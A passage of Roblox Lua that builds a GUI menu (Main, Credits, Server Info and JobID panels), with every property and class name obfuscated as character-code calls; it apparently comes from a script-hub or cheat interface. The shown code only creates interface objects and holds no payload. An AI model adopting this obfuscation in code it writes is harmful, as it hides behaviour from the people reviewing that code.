_llza[_sc(50,102)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,48)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,53)]);
_llza[_sc(51,48)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=100;
_llza[_sc(51,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(51,48)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,48)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,48)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,48)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,48)][_sc(83,105,122,101)]=UDim2.new(0, 60, 0, 22);
_llza[_sc(51,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,48)][_sc(84,101,120,116)]=[[]];
_llza[_sc(51,48)][_sc(78,97,109,101)]=[[TCOMain]];
_llza[_sc(51,49)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,48)]);
_llza[_sc(51,49)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,49)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(51,49)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(51,50)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,48)]);
_llza[_sc(51,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,50)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,50)][_sc(84,101,120,116,83,105,122,101)]=12;
_llza[_sc(51,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,50)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,50)][_sc(84,101,120,116)]=[[Main]];
_llza[_sc(51,50)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,50)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(51,50)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,51)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,50)]);
_llza[_sc(51,51)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,52)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,48)]);
_llza[_sc(51,52)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,52)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(51,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,53)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,52)]);
_llza[_sc(51,53)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,53)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,54)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,53)]);
_llza[_sc(51,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(51,54)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=98;
_llza[_sc(51,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,54)][_sc(78,97,109,101)]=[[---DIVIDER---]];
_llza[_sc(51,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,54)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,54)]);
_llza[_sc(51,55)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(51,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,55)][_sc(78,97,109,101)]=[[dividerFrame]];
_llza[_sc(51,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,56)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,55)]);
_llza[_sc(51,56)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,56)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(51,57)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,55)]);
_llza[_sc(51,57)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,57)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(51,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,97)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,57)]);
_llza[_sc(51,97)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,97)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,98)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,55)]);
_llza[_sc(51,98)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,99)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(51,55)]);
_llza[_sc(51,100)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,54)]);
_llza[_sc(51,100)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 6);
_llza[_sc(51,100)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 4);
_llza[_sc(51,100)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(51,100)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(51,101)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,54)]);
_llza[_sc(51,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(51,101)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,101)][_sc(84,101,120,116,83,105,122,101)]=11;
_llza[_sc(51,101)][_sc(83,105,122,101)]=UDim2.new(0, 25, 1, 0);
_llza[_sc(51,101)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(51,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,101)][_sc(84,101,120,116)]=[[TCO]];
_llza[_sc(51,101)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,101)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(51,101)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,101)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 15, 0, 0);
_llza[_sc(51,102)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,101)]);
_llza[_sc(51,102)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(52,48)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,101)]);
_llza[_sc(52,48)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(52,49)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,53)]);
_llza[_sc(52,49)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=90;
_llza[_sc(52,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(52,49)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,49)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,49)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(52,49)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,49)][_sc(83,105,122,101)]=UDim2.new(0, 60, 0, 22);
_llza[_sc(52,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,49)][_sc(84,101,120,116)]=[[]];
_llza[_sc(52,49)][_sc(78,97,109,101)]=[[Credits]];
_llza[_sc(52,50)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,49)]);
_llza[_sc(52,50)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(52,50)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(52,50)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(52,51)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(52,49)]);
_llza[_sc(52,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,51)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,51)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(52,51)][_sc(84,101,120,116,83,105,122,101)]=12;
_llza[_sc(52,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,51)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,51)][_sc(84,101,120,116)]=[[Credits]];
_llza[_sc(52,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,51)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(52,51)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(52,52)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,51)]);
_llza[_sc(52,52)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(52,53)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(52,49)]);
_llza[_sc(52,53)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,53)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(52,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,54)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(52,53)]);
_llza[_sc(52,54)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(52,54)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(52,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49)]);
_llza[_sc(52,55)][_sc(83,105,122,101)]=UDim2.new(0, 370, 0, 265);
_llza[_sc(52,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,55)][_sc(78,97,109,101)]=[[contentarea]];
_llza[_sc(52,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,55)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 65, 0, 5);
_llza[_sc(52,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(19, 19, 19);
_llza[_sc(52,56)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(52,55)]);
_llza[_sc(52,56)][_sc(78,97,109,101)]=_sc(115,99,114,111,108,108,102,105,120);
_llza[_sc(52,57)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,55)]);
_llza[_sc(52,57)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(52,57)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(52,57)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(52,97)]=Instance.new(_sc(83,99,114,111,108,108,105,110,103,70,114,97,109,101),_llza[_sc(52,55)]);
_llza[_sc(52,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,97)][_sc(67,97,110,118,97,115,83,105,122,101)]=UDim2.new(0, 0, 1.5, 0);
_llza[_sc(52,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,97)][_sc(78,97,109,101)]=[[Home]];
_llza[_sc(52,97)][_sc(83,105,122,101)]=UDim2.new(0, 360, 0, 255);
_llza[_sc(52,97)][_sc(83,99,114,111,108,108,66,97,114,73,109,97,103,101,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,97)][_sc(86,105,115,105,98,108,101)]=false;
_llza[_sc(52,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,97)][_sc(83,99,114,111,108,108,66,97,114,84,104,105,99,107,110,101,115,115)]=0;
_llza[_sc(52,97)][_sc(65,99,116,105,118,101)]=true;
_llza[_sc(52,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,97)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.01351, 0, 0.01887, 0);
_llza[_sc(52,98)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,97)]);
_llza[_sc(52,98)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 255);
_llza[_sc(52,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,98)][_sc(78,97,109,101)]=[[rightside]];
_llza[_sc(52,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,98)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.51081, 0, 0, 0);
_llza[_sc(52,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,99)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(52,98)]);
_llza[_sc(52,99)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(52,99)][_sc(80,97,100,100,105,110,103)]=UDim.new(0, 5);
_llza[_sc(52,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,98)]);
_llza[_sc(52,100)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 160);
_llza[_sc(52,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,100)][_sc(78,97,109,101)]=[[serverTab]];
_llza[_sc(52,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(52,101)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(52,100)]);
_llza[_sc(52,101)][_sc(78,97,109,101)]=_sc(115,101,114,118,101,114,83,99,114,105,112,116);
_llza[_sc(52,102)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(52,100)]);
_llza[_sc(52,102)][_sc(72,111,114,105,122,111,110,116,97,108,70,108,101,120)]=Enum.UIFlexAlignment.Fill;
_llza[_sc(52,102)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(53,48)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,100)]);
_llza[_sc(53,48)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(53,48)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(53,48)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(53,48)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(53,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,100)]);
_llza[_sc(53,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 4);
_llza[_sc(53,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(53,49)][_sc(78,97,109,101)]=[[======ACCENT======]];
_llza[_sc(53,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(53,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(53,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(53,50)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(53,49)]);
_llza[_sc(53,50)][_sc(83,105,122,101)]=UDim2.new(1, -2, 0, 2);
_llza[_sc(53,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(53,50)][_sc(78,97,109,101)]=[[GuiColor]];
_llza[_sc(53,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(53,50)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 1, 0, 1);
_llza[_sc(53,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(53,51)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(53,50)]);
_llza[_sc(53,52)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,100)]);
_llza[_sc(53,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(53,52)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=1;
_llza[_sc(53,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(53,52)][_sc(78,97,109,101)]=[[======TITLE======]];
_llza[_sc(53,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(53,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(53,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(53,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(53,53)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(53,52)]);
_llza[_sc(53,53)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(53,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(53,53)][_sc(84,101,120,116,83,99,97,108,101,100)]=true;
_llza[_sc(53,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(53,53)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(53,53)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(53,53)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(53,53)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(53,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, -0.13333, 15);
_llza[_sc(53,53)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(53,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(53,53)][_sc(84,101,120,116)]=[[Server Info]];
_llza[_sc(53,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(53,53)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(53,53)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.02273, 0, 0, 0);
_llza[_sc(53,54)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(53,53)]);
_llza[_sc(53,54)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(53,55)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(53,53)]);
_llza[_sc(53,55)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 1);
_llza[_sc(53,56)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,100)]);
_llza[_sc(53,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 23);
_llza[_sc(53,56)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(53,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(53,56)][_sc(78,97,109,101)]=[[JobID]];
_llza[_sc(53,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(53,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(53,56)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(53,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(53,57)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(53,56)]);
_llza[_sc(53,57)][_sc(90,73,110,100,101,120)]=49;
_llza[_sc(53,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(53,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(53,57)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(53,57)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(53,57)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(53,57)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(53,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(53,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(53,57)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(53,57)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(53,97)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(53,57)]);
_llza[_sc(53,97)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(53,97)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(53,97)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(53,97)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(53,98)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(53,57)]);
_llza[_sc(53,98)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(53,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(53,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(53,98)][_sc(78,97,109,101)]=[[buttonFrame]];
_llza[_sc(53,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(53,99)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(53,98)]);
_llza[_sc(53,99)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(53,99)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(53,100)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(53,98)]);
_llza[_sc(53,100)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(53,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(53,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(53,100)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(53,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(53,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(53,101)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(53,100)]);
_llza[_sc(53,101)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(53,101)][_sc(82,111,116,97,116,105,111,110)]=90;
